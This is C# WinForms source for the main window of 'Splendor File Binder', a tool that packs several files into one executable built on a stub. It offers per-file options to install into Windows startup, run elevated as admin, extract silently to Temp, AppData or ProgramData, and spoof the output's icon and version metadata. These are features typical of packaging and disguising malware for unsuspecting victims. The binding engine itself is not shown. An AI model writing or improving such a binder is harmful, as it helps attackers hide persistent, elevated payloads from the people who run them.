using System.Drawing.Drawing2D;

namespace SplendorFileBinder;

public partial class MainForm : Form
{
    // Panels & Containers
    private readonly Panel pnlHeader;
    private readonly FluentCard cardStub;
    private readonly FluentCard cardFiles;
    private readonly FluentCard cardFooter;

    // Controls
    private readonly TextBox txtStubPath;
    private readonly FluentButton btnBrowseStub;
    private readonly FluentButton btnAssemblySettings;
    private readonly Label lblAssemblyStatus;
    private readonly ComboBox cmbExtractLocation;

    private readonly DataGridView dgvFiles;
    private readonly Label lblFileCount;
    private readonly FluentButton btnAdd;
    private readonly FluentButton btnRemove;
    private readonly FluentButton btnClear;
    private readonly FluentButton btnBind;

    private readonly FluentProgressBar progressBar;
    private readonly Label lblStatus;
    private readonly Label lblStatusDot;

    private readonly List<string> filePaths = new();
    private AssemblySettings assemblySettings = new();

    private static readonly HashSet<string> StartupExtensions = new(StringComparer.OrdinalIgnoreCase)
    {
        ".exe", ".com", ".scr", ".bat", ".cmd", ".vbs", ".js", ".wsf", ".ps1", ".lnk"
    };

    private static readonly HashSet<string> AdminExtensions = new(StringComparer.OrdinalIgnoreCase)
    {
        ".exe", ".com", ".scr", ".msi", ".bat", ".cmd", ".vbs", ".js", ".wsf", ".ps1", ".reg", ".cpl"
    };

    public MainForm()
    {
        // Window Setup
        Text = "Splendor File Binder";
        ClientSize = new Size(780, 640);
        MinimumSize = new Size(780, 640);
        StartPosition = FormStartPosition.CenterScreen;
        FormBorderStyle = FormBorderStyle.FixedSingle;
        MaximizeBox = false;
        BackColor = Theme.BgWindow;
        ForeColor = Theme.TextPrimary;
        Font = Theme.FontBody;
        AllowDrop = true;

        // Apply dark title bar (Windows 11 / 10)
        Theme.ApplyDarkTitleBar(Handle);

        string iconPath = Path.Combine(AppContext.BaseDirectory, "app.ico");
        if (File.Exists(iconPath))
            Icon = new Icon(iconPath);

        // Window drag & drop
        DragEnter += MainForm_DragEnter;
        DragDrop += MainForm_DragDrop;

        int margin = 16;
        int usableW = ClientSize.Width - (margin * 2);

        // ================================================================
        // 1. HEADER BAR
        // ================================================================
        pnlHeader = new Panel
        {
            Dock = DockStyle.Top,
            Height = 64,
            BackColor = Theme.BgHeader
        };
        pnlHeader.Paint += PnlHeader_Paint;
        Controls.Add(pnlHeader);

        var picLogo = new PictureBox
        {
            Location = new Point(margin, 12),
            Size = new Size(40, 40),
            SizeMode = PictureBoxSizeMode.Zoom,
            BackColor = Color.Transparent
        };
        if (File.Exists(iconPath))
        {
            try { picLogo.Image = Image.FromFile(iconPath); } catch { }
        }
        pnlHeader.Controls.Add(picLogo);

        var lblAppTitle = new Label
        {
            Text = "SPLENDOR FILE BINDER",
            Font = Theme.FontHeaderTitle,
            ForeColor = Theme.TextPrimary,
            Location = new Point(margin + 48, 12),
            AutoSize = true,
            BackColor = Color.Transparent
        };
        pnlHeader.Controls.Add(lblAppTitle);

        string appVersion = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version is { } v
            ? $"v{v.Major}.{v.Minor}" : "v1.0";
        var lblBadge = new Label
        {
            Text = $"{appVersion} • FLUENT EDITION",
            Font = Theme.FontBadge,
            ForeColor = Theme.AccentCyan,
            Location = new Point(margin + 50, 36),
            AutoSize = true,
            BackColor = Color.Transparent
        };
        pnlHeader.Controls.Add(lblBadge);

        // ================================================================
        // 2. CONFIGURATION CARD (Stub Path, Metadata & Extract Location)
        // ================================================================
        cardStub = new FluentCard
        {
            Location = new Point(margin, pnlHeader.Bottom + 14),
            Size = new Size(usableW, 102),
            CornerRadius = 8
        };
        Controls.Add(cardStub);

        var lblStub = new Label
        {
            Text = "STUB ENGINE PATH",
            Font = Theme.FontBadge,
            ForeColor = Theme.TextMuted,
            Location = new Point(14, 12),
            AutoSize = true
        };
        cardStub.Controls.Add(lblStub);

        txtStubPath = new TextBox
        {
            Location = new Point(14, 30),
            Size = new Size(cardStub.Width - 14 - 100 - 12, 26),
            Font = Theme.FontMono,
            BackColor = Theme.BgField,
            ForeColor = Theme.TextPrimary,
            BorderStyle = BorderStyle.FixedSingle,
            Text = FindDefaultStubPath()
        };
        cardStub.Controls.Add(txtStubPath);

        btnBrowseStub = new FluentButton
        {
            Text = "Browse...",
            Location = new Point(cardStub.Width - 14 - 96, 29),
            Size = new Size(96, 28)
        };
        btnBrowseStub.Click += (_, _) =>
        {
            using var dlg = new OpenFileDialog { Title = "Locate SplendorFileStub.exe", Filter = "Executable (*.exe)|*.exe" };
            if (dlg.ShowDialog() == DialogResult.OK) txtStubPath.Text = dlg.FileName;
        };
        cardStub.Controls.Add(btnBrowseStub);

        // Row 2 of Config: Assembly Settings + Status + Extract Location
        btnAssemblySettings = new FluentButton
        {
            Text = "⚙ Assembly & Icon",
            Location = new Point(14, 64),
            Size = new Size(160, 26),
            CustomColor = Theme.AccentCyan
        };
        btnAssemblySettings.Click += (_, _) =>
        {
            using var dlg = new AssemblySettingsForm(assemblySettings);
            if (dlg.ShowDialog(this) == DialogResult.OK)
            {
                assemblySettings = dlg.Result;
                UpdateAssemblyStatusLabel();
            }
        };
        cardStub.Controls.Add(btnAssemblySettings);

        int comboW = 190;
        int comboX = cardStub.Width - 14 - comboW;
        int lblExtractW = 75;
        int lblExtractX = comboX - lblExtractW - 4;

        var lblExtract = new Label
        {
            Text = "Extract to:",
            Font = Theme.FontSmall,
            ForeColor = Theme.TextSecondary,
            Location = new Point(lblExtractX, 68),
            Size = new Size(lblExtractW, 20),
            TextAlign = ContentAlignment.MiddleRight
        };
        cardStub.Controls.Add(lblExtract);

        cmbExtractLocation = new ComboBox
        {
            Location = new Point(comboX, 65),
            Size = new Size(comboW, 24),
            Font = Theme.FontBody,
            BackColor = Theme.BgField,
            ForeColor = Theme.TextPrimary,
            FlatStyle = FlatStyle.Flat,
            DropDownStyle = ComboBoxStyle.DropDownList
        };
        cmbExtractLocation.Items.AddRange(new object[]
        {
            "Temp (%TEMP%)",
            "AppData (%APPDATA%)",
            "Current Directory",
            "ProgramData (Admin)"
        });
        cmbExtractLocation.SelectedIndex = 0;
        cardStub.Controls.Add(cmbExtractLocation);

        lblAssemblyStatus = new Label
        {
            Text = "",
            Font = Theme.FontSmall,
            ForeColor = Theme.AccentGreen,
            Location = new Point(180, 68),
            Size = new Size(Math.Max(50, lblExtractX - 186), 20),
            AutoEllipsis = true,
            TextAlign = ContentAlignment.MiddleLeft
        };
        cardStub.Controls.Add(lblAssemblyStatus);

        // ================================================================
        // 3. FILES CARD (List, Actions, Drag & Drop)
        // ================================================================
        cardFiles = new FluentCard
        {
            Location = new Point(margin, cardStub.Bottom + 12),
            Size = new Size(usableW, 316),
            CornerRadius = 8
        };
        Controls.Add(cardFiles);

        lblFileCount = new Label
        {
            Text = "FILES TO BIND  (0 files in list)",
            Font = Theme.FontBadge,
            ForeColor = Theme.TextMuted,
            Location = new Point(14, 12),
            AutoSize = true
        };
        cardFiles.Controls.Add(lblFileCount);

        var lblDropHint = new Label
        {
            Text = "💡 Drag & drop files directly anywhere into the grid",
            Font = Theme.FontSmall,
            ForeColor = Theme.TextMuted,
            Location = new Point(usableW - 14 - 300, 12),
            Size = new Size(300, 18),
            TextAlign = ContentAlignment.TopRight
        };
        cardFiles.Controls.Add(lblDropHint);

        int sideBtnW = 105;
        int gridW = cardFiles.Width - 28 - sideBtnW - 12;

        dgvFiles = new DataGridView
        {
            Location = new Point(14, 34),
            Size = new Size(gridW, 266),
            BackgroundColor = Theme.BgField,
            GridColor = Theme.BorderSubtle,
            BorderStyle = BorderStyle.None,
            CellBorderStyle = DataGridViewCellBorderStyle.SingleHorizontal,
            RowHeadersVisible = false,
            AllowUserToAddRows = false,
            AllowUserToDeleteRows = false,
            AllowUserToResizeRows = false,
            SelectionMode = DataGridViewSelectionMode.FullRowSelect,
            MultiSelect = true,
            EditMode = DataGridViewEditMode.EditOnEnter,
            ScrollBars = ScrollBars.Vertical,
            Font = Theme.FontBody,
            EnableHeadersVisualStyles = false,
            ColumnHeadersHeight = 32,
            ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing,
            AllowDrop = true
        };
        dgvFiles.RowTemplate.Height = 30;

        Theme.EnableDoubleBuffering(dgvFiles);

        dgvFiles.DragEnter += MainForm_DragEnter;
        dgvFiles.DragDrop += MainForm_DragDrop;

        // Header style
        dgvFiles.ColumnHeadersDefaultCellStyle = new DataGridViewCellStyle
        {
            BackColor = Color.FromArgb(22, 24, 30),
            ForeColor = Theme.TextSecondary,
            Font = Theme.FontBodySemibold,
            SelectionBackColor = Color.FromArgb(22, 24, 30),
            SelectionForeColor = Theme.TextSecondary,
            Padding = new Padding(8, 0, 0, 0)
        };

        // Grid-level default cell style
        dgvFiles.DefaultCellStyle = new DataGridViewCellStyle
        {
            BackColor = Theme.BgField,
            ForeColor = Theme.TextPrimary,
            SelectionBackColor = Color.FromArgb(28, 48, 70),
            SelectionForeColor = Color.White,
            Padding = new Padding(8, 0, 0, 0)
        };
        dgvFiles.AlternatingRowsDefaultCellStyle = new DataGridViewCellStyle
        {
            BackColor = Color.FromArgb(22, 25, 32),
            ForeColor = Theme.TextPrimary,
            SelectionBackColor = Color.FromArgb(28, 48, 70),
            SelectionForeColor = Color.White,
            Padding = new Padding(8, 0, 0, 0)
        };

        // Columns
        dgvFiles.Columns.Add(new DataGridViewTextBoxColumn
        {
            Name = "FileName", HeaderText = "File Name",
            Width = gridW - 90 - 75 - 75 - 18, ReadOnly = true,
            SortMode = DataGridViewColumnSortMode.NotSortable
        });

        var colSize = new DataGridViewTextBoxColumn
        {
            Name = "Size", HeaderText = "Size", Width = 90,
            ReadOnly = true, SortMode = DataGridViewColumnSortMode.NotSortable
        };
        colSize.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleRight;
        colSize.DefaultCellStyle.ForeColor = Theme.TextSecondary;
        dgvFiles.Columns.Add(colSize);

        var colStartup = new DataGridViewCheckBoxColumn
        {
            Name = "Startup", HeaderText = "Startup", Width = 75,
            SortMode = DataGridViewColumnSortMode.NotSortable,
            FalseValue = false, TrueValue = true
        };
        colStartup.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
        dgvFiles.Columns.Add(colStartup);

        var colAdmin = new DataGridViewCheckBoxColumn
        {
            Name = "Admin", HeaderText = "Admin", Width = 75,
            SortMode = DataGridViewColumnSortMode.NotSortable,
            FalseValue = false, TrueValue = true
        };
        colAdmin.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
        dgvFiles.Columns.Add(colAdmin);

        dgvFiles.CellContentClick += DgvFiles_CellContentClick;
        dgvFiles.CellPainting += DgvFiles_CellPainting;
        cardFiles.Controls.Add(dgvFiles);

        // Action Buttons on Right
        int btnX = cardFiles.Width - 14 - sideBtnW;
        btnAdd = new FluentButton
        {
            Text = "+ Add Files",
            Location = new Point(btnX, 34),
            Size = new Size(sideBtnW, 34),
            CornerRadius = 6
        };
        btnAdd.Click += BtnAdd_Click;
        cardFiles.Controls.Add(btnAdd);

        btnRemove = new FluentButton
        {
            Text = "− Remove",
            Location = new Point(btnX, 74),
            Size = new Size(sideBtnW, 32),
            CornerRadius = 6
        };
        btnRemove.Click += BtnRemove_Click;
        cardFiles.Controls.Add(btnRemove);

        btnClear = new FluentButton
        {
            Text = "Clear All",
            Location = new Point(btnX, 112),
            Size = new Size(sideBtnW, 32),
            IsDanger = true,
            CornerRadius = 6
        };
        btnClear.Click += BtnClear_Click;
        cardFiles.Controls.Add(btnClear);

        // Huge primary Bind Button
        btnBind = new FluentButton
        {
            Text = "⚡ BIND FILES",
            Location = new Point(btnX, 244),
            Size = new Size(sideBtnW, 56),
            IsPrimary = true,
            CornerRadius = 8,
            Font = new Font("Segoe UI", 10.5f, FontStyle.Bold)
        };
        btnBind.Click += BtnBind_Click;
        cardFiles.Controls.Add(btnBind);

        // ================================================================
        // 4. FOOTER CARD (Progress & Status)
        // ================================================================
        cardFooter = new FluentCard
        {
            Location = new Point(margin, cardFiles.Bottom + 12),
            Size = new Size(usableW, 64),
            CornerRadius = 8
        };
        Controls.Add(cardFooter);

        progressBar = new FluentProgressBar
        {
            Location = new Point(14, 12),
            Size = new Size(cardFooter.Width - 28, 6),
            ProgressColor = Theme.AccentCyan
        };
        cardFooter.Controls.Add(progressBar);

        lblStatusDot = new Label
        {
            Text = "●",
            Font = new Font("Segoe UI", 9f),
            ForeColor = Theme.AccentGreen,
            Location = new Point(14, 28),
            Size = new Size(16, 20)
        };
        cardFooter.Controls.Add(lblStatusDot);

        lblStatus = new Label
        {
            Text = "Ready. Add files and click BIND to create your standalone executable.",
            Font = Theme.FontBody,
            Location = new Point(32, 28),
            Size = new Size(cardFooter.Width - 46, 26),
            ForeColor = Theme.TextSecondary
        };
        cardFooter.Controls.Add(lblStatus);
    }

    private void PnlHeader_Paint(object? sender, PaintEventArgs e)
    {
        using var pen = new Pen(Theme.BorderSubtle, 1);
        e.Graphics.DrawLine(pen, 0, pnlHeader.Height - 1, pnlHeader.Width, pnlHeader.Height - 1);
    }

    // ----------------------------------------------------------------
    // Drag & Drop Handlers
    // ----------------------------------------------------------------

    private void MainForm_DragEnter(object? sender, DragEventArgs e)
    {
        if (e.Data != null && e.Data.GetDataPresent(DataFormats.FileDrop))
            e.Effect = DragDropEffects.Copy;
        else
            e.Effect = DragDropEffects.None;
    }

    private void MainForm_DragDrop(object? sender, DragEventArgs e)
    {
        if (e.Data?.GetData(DataFormats.FileDrop) is string[] files)
        {
            AddFiles(files);
        }
    }

    private void AddFiles(IEnumerable<string> files)
    {
        int addedCount = 0;
        foreach (string file in files)
        {
            if (File.Exists(file) && !filePaths.Any(p => string.Equals(p, file, StringComparison.OrdinalIgnoreCase)))
            {
                filePaths.Add(file);
                int rowIndex = dgvFiles.Rows.Add(Path.GetFileName(file), FormatSize(new FileInfo(file).Length), false, false);
                
                // Explicitly set each row's styles so they can NEVER fall back to black
                var row = dgvFiles.Rows[rowIndex];
                Color rowBg = (rowIndex % 2 == 0) ? Theme.BgField : Color.FromArgb(22, 25, 32);
                row.DefaultCellStyle.BackColor = rowBg;
                row.DefaultCellStyle.ForeColor = Theme.TextPrimary;
                row.DefaultCellStyle.SelectionBackColor = Color.FromArgb(28, 48, 70);
                row.DefaultCellStyle.SelectionForeColor = Color.White;

                addedCount++;
            }
        }

        UpdateFileCount();
        dgvFiles.ClearSelection();
        dgvFiles.Invalidate();
        dgvFiles.Update();

        if (addedCount > 0)
        {
            SetStatus($"Added {addedCount} file{(addedCount > 1 ? "s" : "")}. Total: {filePaths.Count} file{(filePaths.Count > 1 ? "s" : "")} in list.", Theme.AccentGreen);
        }
        else
        {
            SetStatus("No new files added (already in list or not found).", Theme.AccentAmber);
        }
    }

    // ----------------------------------------------------------------
    // DataGridView events
    // ----------------------------------------------------------------

    private void DgvFiles_CellContentClick(object? sender, DataGridViewCellEventArgs e)
    {
        if (e.RowIndex < 0 || e.RowIndex >= filePaths.Count) return;
        string colName = dgvFiles.Columns[e.ColumnIndex].Name;
        string ext = Path.GetExtension(filePaths[e.RowIndex]);

        if (colName == "Startup" && !StartupExtensions.Contains(ext))
        {
            BeginInvoke(() => dgvFiles.Rows[e.RowIndex].Cells["Startup"].Value = false);
            SetStatus($"⚠ {ext} files cannot be registered for Windows startup.", Theme.AccentAmber);
        }
        else if (colName == "Admin" && !AdminExtensions.Contains(ext))
        {
            BeginInvoke(() => dgvFiles.Rows[e.RowIndex].Cells["Admin"].Value = false);
            SetStatus($"⚠ {ext} files cannot be run with elevated admin privileges.", Theme.AccentAmber);
        }
    }

    private void DgvFiles_CellPainting(object? sender, DataGridViewCellPaintingEventArgs e)
    {
        if (e.RowIndex < 0) return;
        if (e.RowIndex >= filePaths.Count) return;

        string colName = dgvFiles.Columns[e.ColumnIndex].Name;
        string ext = Path.GetExtension(filePaths[e.RowIndex]);

        bool disabled = (colName == "Startup" && !StartupExtensions.Contains(ext)) ||
                        (colName == "Admin" && !AdminExtensions.Contains(ext));

        if (disabled)
        {
            // Compute proper background color matching row or selection state
            bool isRowSelected = (e.State & DataGridViewElementStates.Selected) != 0;
            Color bg = isRowSelected ? Color.FromArgb(28, 48, 70)
                     : (e.RowIndex % 2 == 0 ? Theme.BgField : Color.FromArgb(22, 25, 32));

            using var bgBrush = new SolidBrush(bg);
            e.Graphics!.FillRectangle(bgBrush, e.CellBounds);

            // Draw single subtle bottom border
            using var gridPen = new Pen(Theme.BorderSubtle, 1);
            e.Graphics.DrawLine(gridPen, e.CellBounds.Left, e.CellBounds.Bottom - 1, e.CellBounds.Right, e.CellBounds.Bottom - 1);

            // Draw centered dash using cell's font or fallback
            Font dashFont = e.CellStyle?.Font ?? Font;
            var sz = e.Graphics!.MeasureString("—", dashFont);
            float x = e.CellBounds.X + (e.CellBounds.Width - sz.Width) / 2;
            float y = e.CellBounds.Y + (e.CellBounds.Height - sz.Height) / 2;
            using var dashBrush = new SolidBrush(Color.FromArgb(90, 95, 110));
            e.Graphics.DrawString("—", dashFont, dashBrush, x, y);

            e.Handled = true;
        }
    }

    // ----------------------------------------------------------------
    // Button handlers
    // ----------------------------------------------------------------

    private void BtnAdd_Click(object? sender, EventArgs e)
    {
        using var dlg = new OpenFileDialog
        {
            Title = "Select files to bind",
            Filter = "All Files (*.*)|*.*",
            Multiselect = true
        };
        if (dlg.ShowDialog() != DialogResult.OK) return;
        AddFiles(dlg.FileNames);
    }

    private void BtnRemove_Click(object? sender, EventArgs e)
    {
        var indices = dgvFiles.SelectedRows.Cast<DataGridViewRow>()
            .Select(r => r.Index).Where(i => i >= 0 && i < filePaths.Count)
            .OrderByDescending(i => i).ToList();

        foreach (int idx in indices)
        {
            filePaths.RemoveAt(idx);
            dgvFiles.Rows.RemoveAt(idx);
        }

        // Re-index row background colors for alternating stripe consistency
        for (int i = 0; i < dgvFiles.Rows.Count; i++)
        {
            Color rowBg = (i % 2 == 0) ? Theme.BgField : Color.FromArgb(22, 25, 32);
            dgvFiles.Rows[i].DefaultCellStyle.BackColor = rowBg;
            dgvFiles.Rows[i].DefaultCellStyle.ForeColor = Theme.TextPrimary;
            dgvFiles.Rows[i].DefaultCellStyle.SelectionBackColor = Color.FromArgb(28, 48, 70);
            dgvFiles.Rows[i].DefaultCellStyle.SelectionForeColor = Color.White;
        }

        UpdateFileCount();
        dgvFiles.Invalidate();
        dgvFiles.Update();
        SetStatus($"Removed {indices.Count} file(s). {filePaths.Count} file(s) remaining.", Theme.TextSecondary);
    }

    private void BtnClear_Click(object? sender, EventArgs e)
    {
        if (filePaths.Count == 0) return;
        filePaths.Clear();
        dgvFiles.Rows.Clear();
        UpdateFileCount();
        dgvFiles.Invalidate();
        dgvFiles.Update();
        SetStatus("File list cleared.", Theme.TextSecondary);
    }

    private async void BtnBind_Click(object? sender, EventArgs e)
    {
        if (filePaths.Count == 0)
        {
            SetStatus("⚠ Please add at least one file to bind.", Theme.AccentAmber);
            return;
        }

        string stubPath = txtStubPath.Text.Trim();
        if (!File.Exists(stubPath))
        {
            SetStatus("⚠ SplendorFileStub.exe not found at specified path.", Theme.AccentRose);
            return;
        }

        using var saveDlg = new SaveFileDialog
        {
            Title = "Save bound executable as...",
            Filter = "Executable (*.exe)|*.exe",
            FileName = "BoundOutput.exe"
        };
        if (saveDlg.ShowDialog() != DialogResult.OK) return;

        string outputPath = saveDlg.FileName;
        string? iconPath = assemblySettings.ChangeIcon ? assemblySettings.IconPath : null;
        var versionInfo = assemblySettings.ChangeAssemblyInfo ? assemblySettings.VersionInfo : null;

        var startupFlags = new List<bool>();
        var adminFlags = new List<bool>();
        for (int i = 0; i < dgvFiles.Rows.Count && i < filePaths.Count; i++)
        {
            startupFlags.Add(dgvFiles.Rows[i].Cells["Startup"].Value is true);
            adminFlags.Add(dgvFiles.Rows[i].Cells["Admin"].Value is true);
        }

        string extractLocation = cmbExtractLocation.SelectedIndex switch
        {
            1 => "appdata",
            2 => "currentdir",
            3 => "programdata",
            _ => "temp"
        };

        SetEnabled(false);
        progressBar.Value = 0;
        SetStatus("Binding files into standalone executable...", Theme.AccentCyan);

        try
        {
            await Task.Run(() =>
            {
                BinderEngine.Bind(stubPath, filePaths, outputPath,
                    iconPath: iconPath, versionInfo: versionInfo,
                    startupFlags: startupFlags, adminFlags: adminFlags,
                    extractLocation: extractLocation,
                    progress: p => Invoke(() => progressBar.Value = (int)(p * 100)));
            });

            long sz = new FileInfo(outputPath).Length;
            progressBar.Value = 100;
            SetStatus($"Created: {Path.GetFileName(outputPath)} ({FormatSize(sz)})", Theme.AccentGreen);

            MessageBox.Show(
                $"Bound executable created successfully!\n\n" +
                $"Output: {outputPath}\n" +
                $"Size: {FormatSize(sz)}\n" +
                $"Embedded Files: {filePaths.Count}\n" +
                (startupFlags.Count(f => f) > 0 ? $"Startup: {startupFlags.Count(f => f)}\n" : "") +
                (adminFlags.Count(f => f) > 0 ? $"Run as Admin: {adminFlags.Count(f => f)}\n" : "") +
                $"Extract to: {cmbExtractLocation.SelectedItem}",
                "Splendor File Binder", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
            SetStatus($"Error: {ex.Message}", Theme.AccentRose);
            progressBar.Value = 0;
        }
        finally
        {
            SetEnabled(true);
        }
    }

    // ----------------------------------------------------------------
    // Helpers
    // ----------------------------------------------------------------

    private void SetEnabled(bool on)
    {
        btnBind.Enabled = on;
        btnAdd.Enabled = on;
        btnRemove.Enabled = on;
        btnClear.Enabled = on;
        btnAssemblySettings.Enabled = on;
        cmbExtractLocation.Enabled = on;
        txtStubPath.Enabled = on;
        btnBrowseStub.Enabled = on;
    }

    private void UpdateFileCount()
    {
        lblFileCount.Text = $"FILES TO BIND  ({filePaths.Count} file{(filePaths.Count != 1 ? "s" : "")} in list)";
    }

    private void UpdateAssemblyStatusLabel()
    {
        var parts = new List<string>();
        if (assemblySettings.ChangeAssemblyInfo && assemblySettings.VersionInfo.HasAnyValue)
            parts.Add("📋 " + (assemblySettings.VersionInfo.FileDescription
                ?? assemblySettings.VersionInfo.ProductName ?? "Custom Info"));
        if (assemblySettings.ChangeIcon && !string.IsNullOrEmpty(assemblySettings.IconPath))
            parts.Add("🎨 " + Path.GetFileName(assemblySettings.IconPath));

        lblAssemblyStatus.Text = parts.Count > 0 ? string.Join(" · ", parts) : "";
        lblAssemblyStatus.ForeColor = parts.Count > 0 ? Theme.AccentGreen : Theme.TextMuted;
    }

    private void SetStatus(string text, Color color)
    {
        lblStatus.Text = text;
        lblStatus.ForeColor = color;
        lblStatusDot.ForeColor = color;
    }

    private static string FormatSize(long bytes)
    {
        string[] u = ["B", "KB", "MB", "GB"];
        double s = bytes; int i = 0;
        while (s >= 1024 && i < u.Length - 1) { s /= 1024; i++; }
        return $"{s:F1} {u[i]}";
    }

    private static string FindDefaultStubPath()
    {
        var dirs = new List<string>();
        string? appDir = Path.GetDirectoryName(Application.ExecutablePath);
        if (appDir != null) dirs.Add(appDir);
        dirs.Add(Directory.GetCurrentDirectory());

        foreach (string d in dirs)
            if (File.Exists(Path.Combine(d, "SplendorFileStub.exe")))
                return Path.Combine(d, "SplendorFileStub.exe");

        string[] rels = [
            @"publish\Stub\SplendorFileStub.exe",
            @"..\..\..\..\..\publish\Stub\SplendorFileStub.exe",
            @"..\..\..\..\Stub\bin\Debug\net10.0\win-x64\SplendorFileStub.exe",
            @"src\Stub\bin\Debug\net10.0\win-x64\SplendorFileStub.exe",
        ];
        foreach (string d in dirs)
            foreach (string r in rels)
            { string f = Path.GetFullPath(Path.Combine(d, r)); if (File.Exists(f)) return f; }

        return "SplendorFileStub.exe";
    }
}
